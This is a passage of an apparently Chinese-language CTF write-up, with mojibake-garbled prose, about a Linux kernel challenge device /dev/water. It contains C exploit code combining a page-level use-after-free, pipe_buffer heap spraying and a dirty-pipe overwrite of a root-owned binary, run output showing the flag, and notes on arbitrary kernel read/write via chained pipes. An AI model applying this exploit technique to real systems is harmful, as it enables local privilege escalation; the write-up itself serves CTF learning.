class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;write chunk data D&quot;</span>);</span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fill the hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_primitive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz;</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write pipe then we can read&quot;</span>);</span><br><span class="line">  <span class="comment">// ? å› ä¸ºæˆ‘ä»¬åœ¨find victim å†™äº† 3 ä¸ª å­—ç¬¦ä¸² å’Œ 3ä¸ª sizeof(int) å¯¼è‡´</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer, SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;free origin pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fcntl to set the pipe in victim page&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;failed to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(target_fd, &amp;offset, snd_pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) <span class="built_in">err_exit</span>(<span class="string">&quot;splice() error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ? è¿˜æ˜¯find victim_idx è¯»å–äº† tag å’Œ idx å¯¼è‡´çš„æŒ‡é’ˆåç§»</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer, SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;ops: %#llx&quot;</span>, (<span class="type">size_t</span>)info_pipe_buf.ops);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;debug&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info_pipe_buf.flags |= PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">  info_pipe_buf.offset = <span class="number">0</span>;</span><br><span class="line">  info_pipe_buf.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// æ³„éœ²ä¿¡æ¯çš„ä¸‹ä¸€ä¸ªpipe_buf</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;dirty pipe write target file&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(snd_pipe_fd[i][<span class="number">1</span>], payload, <span class="built_in">sizeof</span>(payload));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write ook&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(target_fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buffer, <span class="string">&quot;/bin/sh&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;do not write&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;/sbin/poweroff: %s&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">close</span>(target_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/sh /tmp/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;cp /bin/cat /tmp/cat&quot;</span>);</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">pipe_primitive</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;pause after dirty pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">check</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;if see this, write ok&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸç‡è›®é«˜çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Boot took 2.16 seconds</span><br><span class="line">/ $ ./exp</span><br><span class="line">[+] spray pipe</span><br><span class="line">[+] change ring_size make pipe-&gt;bufs kmalloc-512</span><br><span class="line">[+] kmalloc-512 hole</span><br><span class="line">[+] new chunk <span class="keyword">then</span> free</span><br><span class="line">write chunk data D</span><br><span class="line"></span><br><span class="line">[+] fill the hole</span><br><span class="line">[+] alloc pipe_buffer pages</span><br><span class="line">[+] uaf change pipe-&gt;bufs-&gt;page</span><br><span class="line">[+] find victim pipe</span><br><span class="line">[+] succeed find victim: 0, origin: 1</span><br><span class="line">pause after uaf</span><br><span class="line"></span><br><span class="line">[+] write pipe <span class="keyword">then</span> we can <span class="built_in">read</span></span><br><span class="line">[+] free origin pipe</span><br><span class="line">[+] fcntl to <span class="built_in">set</span> the pipe <span class="keyword">in</span> victim page</span><br><span class="line">[+] page: 0xffffea0000193140</span><br><span class="line">[+] ops: 0xffffffff82248500</span><br><span class="line">debug</span><br><span class="line"></span><br><span class="line">[+] dirty pipe write target file</span><br><span class="line">[+] write ook</span><br><span class="line">pause after dirty pipe</span><br><span class="line"></span><br><span class="line">/sbin/poweroff: <span class="comment">#!/tmp/sh</span></span><br><span class="line"> /tmp/Ú€@<span class="keyword">if</span> see this, write ok</span><br><span class="line"></span><br><span class="line">[   14.466663] BUG: Bad page state <span class="keyword">in</span> process exp  pfn:07714</span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">flag&#123;test_flag&#125;</span><br><span class="line">/bin/ls: line 3: syntax error: unexpected <span class="string">&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h4 id="task-struct-cred"><a href="#task-struct-cred" class="headerlink" title="task struct cred"></a>task struct cred</h4><p>äºŒçº§ç®¡é“ï¼Œä»»æ„åœ°å€è¯»å†™ï¼Œä¹Ÿå¯ä»¥å†™ <code>modprobe_path</code>ã€‚</p><p>ä¸ºä»€ä¹ˆåˆšå¼€å§‹å†™pipeè¦å†™ä¸‰ä¸ªæ•°å­—ï¼šå› ä¸ºæˆ‘ä»¬è¦è‡³å°‘ä¸‰æ¬¡è¯»å–è·å¾—idxã€‚</p><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç¬¬äºŒæ¬¡page-level-uafï¼Œå€ŸåŠ©å¦å¤–ä¸‰ä¸ªç®¡é“ï¼š</p><ul><li>ä½ç½®åœ¨ç¬¬äºŒä¸ª uaf page ï¼š pipe1 &amp; pipe2 &amp; pipe3ï¼Œå…¶pageæŒ‡é’ˆå…¨éƒ½æŒ‡å‘ç¬¬äºŒä¸ª uaf page å¯¹åº”çš„ struct page ç»“æ„ä½“ã€‚</li><li>pipe1ï¼Œå®ç°ä»»æ„åœ°å€è¯»ï¼Œåªéœ€è¦ä¿®æ”¹pageæŒ‡é’ˆå’Œ offset + len å˜é‡</li><li>pipe2ï¼Œä¿®æ”¹pipe3 </li><li>pipe3ï¼Œå¯ä»¥ä¿®æ”¹pipe1 &amp; pipe 2 å†…å®¹</li><li>åªéœ€è¦æ§åˆ¶ pipe_buffer çš„ page æŒ‡é’ˆã€offset å’Œ len å°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">origin â€¾â€¾|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz +</span><br><span class="line">  +------------+</span><br><span class="line"></span><br><span class="line">è¯»å–pipe_bufs2 è·å¾— info_pipe_buf,ç„¶åé€šè¿‡ victim å†™ pipe_bufs3ï¼Œè¿™é‡Œè¿™ä¸ªpage</span><br><span class="line">origin ï¿£|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz + â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾|</span><br><span class="line">  +------------+           |</span><br><span class="line">  +   ...      +           |</span><br><span class="line">  +------------+           |</span><br><span class="line">  + pipe_bufsn + --------------&gt; page</span><br><span class="line">  +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ‰¾åˆ°è¿™ä¸¤ä¸ªidx, ç„¶åæ„é€ äºŒçº§page-level-uafï¼Œä½¿ç”¨ pipe_bufs ä½¿ç”¨è¿™ä¸ª page</span><br><span class="line">origin ï¿£|</span><br><span class="line">vimtim ---&gt; uaf page</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsx +</span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsy + </span><br><span class="line">  +------------+</span><br><span class="line">  + pipe_bufsz + snd_victimâ€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾|</span><br><span class="line">  +------------+                     |</span><br><span class="line">  +   ...      +                     |</span><br><span class="line">  +------------+                     |</span><br><span class="line">  + pipe_bufsn + snd_origin--------------&gt; uaf  page</span><br><span class="line">  +------------+                          +------------+</span><br><span class="line">              + pipe_bufs1 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs2 + </span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs3 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          + pipe_bufs4 +</span><br><span class="line">                          +------------+</span><br><span class="line">                          +     ...    +</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snd_victim_idx å†™ 0, 1, 2, 3 ä¼ªé€ å¯¹åº”çš„ pipe_buffer page len offsetï¼Œéƒ½å¯ä»¥è¯»å†™pipe_bufs2</span><br><span class="line"></span><br><span class="line">æœ€ç»ˆæƒ…å½¢</span><br><span class="line">4 å‘ 2 é‡Œé¢å†™å†…å®¹ï¼Œæ”¹å˜ page å’Œ offset å’Œ lenï¼Œå°±èƒ½ä»»æ„åœ°å€è¯»ã€‚</span><br><span class="line">4 å‘ 3 é‡Œå†™å†…å®¹ï¼Œä½¿ Y write å¼€å§‹åœ°å€ä¸º Z</span><br><span class="line">3 æ”¹ 4ï¼Œå¯ä»¥ä¸€ç›´å†™ X</span><br></pre></td></tr></table></figure><p>åœ¨æ„é€ ç¬¬ä¸€ä¸ª page-level-uaf ä¸­ï¼Œè¯»å–å†…å®¹å³ä½¿æ‰¾åˆ°ä¹Ÿä¸èƒ½ breakï¼Œå¦åˆ™ç¬¬äºŒæ¬¡è¯»å–å‡ºé”™ã€‚</p><p>exp å¦‚ä¸‹</p><ul><li>åœ¨info leak å‡ºé”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¯»å–ä¸å‡ºæ¥å†…å®¹ï¼Œçœ‹äº†å‡ éä¹Ÿä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜ï¼Œå½“å±€è€…è¿·å§ğŸ¤¡ã€‚</li></ul><p>æ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_61670993/article/details/134359694">å¼ºç½‘æ‹Ÿæ€2023-water-ker</a>ï¼Œexpå¯ä»¥ææƒï¼Œç¼–è¯‘æ—¶æ˜¾ç¤ºç¼ºå°‘äº†ä¸€ä¸ªæ‹¬å·ï¼Œè¡¥ä¸Šå°±è¡Œã€‚</p><p>å¦‚ä¸‹ä¸ºå¤±è´¥çš„expã€‚<del>æ²¡æˆåŠŸä¸ºä»€ä¹ˆè¦æ”¾ä¸Šæ¥ï¼Œä¸èƒ½è®©æˆ‘ç™½å†™å§</del></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span 